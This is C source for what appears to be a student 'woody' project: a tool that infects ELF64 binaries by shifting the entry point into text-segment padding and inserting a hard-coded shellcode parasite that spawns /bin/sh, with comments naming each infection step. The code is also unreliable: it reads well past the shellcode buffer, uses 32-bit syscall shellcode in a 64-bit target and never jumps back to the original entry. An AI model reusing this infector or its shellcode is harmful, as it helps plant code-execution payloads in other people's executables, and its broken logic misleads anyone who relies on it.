/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   woody.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: droly <marvin@42.fr>                       +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/04/12 11:28:09 by droly             #+#    #+#             */
/*   Updated: 2018/04/17 14:18:55 by amaindro         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "woody.h"



#include <string.h> //KILL MEEEEEEEEEEEEEEEEEEEEEEEE



static inline	Elf64_Shdr *elf_sheader(Elf64_Ehdr *header) {
		return (Elf64_Shdr *)((void*)header + header->e_shoff);
}

static inline	Elf64_Phdr *elf_pheader(Elf64_Ehdr *header) {
		return (Elf64_Phdr *)((void*)header + header->e_phoff);
}

static inline	Elf64_Shdr *elf_section(Elf64_Ehdr *header, int i) {
	return &elf_sheader(header)[i];
}

static inline	Elf64_Phdr *elf_program(Elf64_Ehdr *header, int i) {
	return &elf_pheader(header)[i];
}

char			*elf_str_table(Elf64_Ehdr *header) {
	if (header->e_shstrndx == SHN_UNDEF)
		return NULL;
	return (char *)header + elf_section(header, header->e_shstrndx)->sh_offset;
}

char			*elf_lookup_string(Elf64_Ehdr *header, int offset) {
	char *strtab = elf_str_table(header);
	if (strtab == NULL)
		return NULL;
	return strtab + offset;
}

void			update_segment_64(Elf64_Ehdr *header, Elf64_Off offset)
{
	Elf64_Phdr	*program;
	int			i;

	i = 0;
	while (i < header->e_phnum)
	{
		program = elf_program(header, i++);
		if (program->p_offset > offset)
		{
			program->p_offset += PAGE_SIZE;
		}
	}
}

void			update_section_64(Elf64_Ehdr *header, Elf64_Off offset)
{
	Elf64_Shdr	*section;
	int			i;

	i = 0;
	while (i < header->e_shnum)
	{
		section = elf_section(header, i++);
		if (section->sh_offset > offset)
		{
			section->sh_offset += PAGE_SIZE;
		}
	}
}

void			Elf64(void *ptr, size_t size)
{
	char		code[] = "\x89\x5e\x1f\xeb\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
	//char		code[] = "\x90\xf8\x89\x48";
//	char		code[] = "\x89\x5e\x1f\xeb\x76";
	size_t		code_size = strlen(code);
	int			i;
	Elf64_Ehdr	*header;
	Elf64_Phdr	*program;
	Elf64_Shdr	*section;
	int			fd;
	void		*tmp_entry;
	size_t		tmp_size;
	size_t		padding_size;


	header = ptr;

	//Patch the insertion code (parasite) to jump to the entry point (original)
	tmp_entry = (void *)header->e_entry;

	//Locate the text segment program header
	i = 0;
	while (i < header->e_phnum)
	{
		program = elf_program(header, i++);
		printf("type = %d, flag = %d\noffset = %llu\n", program->p_type, program->p_flags, program->p_offset);
		if (program->p_type == PT_LOAD && program->p_flags & PF_X)
			break ;
	}
	tmp_size = program->p_offset + program->p_filesz;

	padding_size = program->p_align;//A CHANGER PAS FIABLE
	//Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
	header->e_entry = program->p_vaddr + program->p_filesz;

	//Increase p_filesz by account for the new code (parasite)
	program->p_filesz += code_size;
	//Increase p_memsz to account for the new code (parasite)
	program->p_memsz += code_size;

	//For the last shdr in the text segment
	i = 0;
	while (i < header->e_shnum)
	{
		section = elf_section(header, i);
		if (elf_section(header, i + 1)->sh_addr > header->e_entry)
		{
	//increase sh_len by the parasite length
			section->sh_size += code_size;
			break ;
		}
		i++;
	}

	update_segment_64(header, program->p_offset);
	update_section_64(header, program->p_offset);
	header->e_shoff += PAGE_SIZE;

	fd = open("woody2", O_WRONLY | O_APPEND | O_CREAT, 0777);
	write(fd, ptr, tmp_size);
	//Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
	write(fd, code, PAGE_SIZE);
	write(fd, ptr + tmp_size, size - tmp_size);
}

void			magic_number(void *ptr, size_t size, char *file_name)
{
	char *test;

	test = ptr;
	if (*(int *)ptr == *(int *)ELFMAG && test[EI_CLASS] == ELFCLASS64)
	{
		Elf64(ptr, size);
	}
	else
		printf("Wrong file signature\n");
}

int				main(int ac, char **av)
{
	int				fd;
	char			*ptr;
	off_t			size;

	if (ac < 2)
		return (0);
	if ((fd = open(av[1], O_RDONLY)) < 0)
		return (0);
	if ((size = lseek(fd, 0, SEEK_END)) < 0)
		return (0);
	if ((ptr = mmap(0, size, PROT_READ | PROT_WRITE,
					MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		return (0);
	if (close(fd) < 0)
		return (0);
	magic_number(ptr, size, av[1]);
	if (munmap(ptr, size) < 0)
		return (0);
}
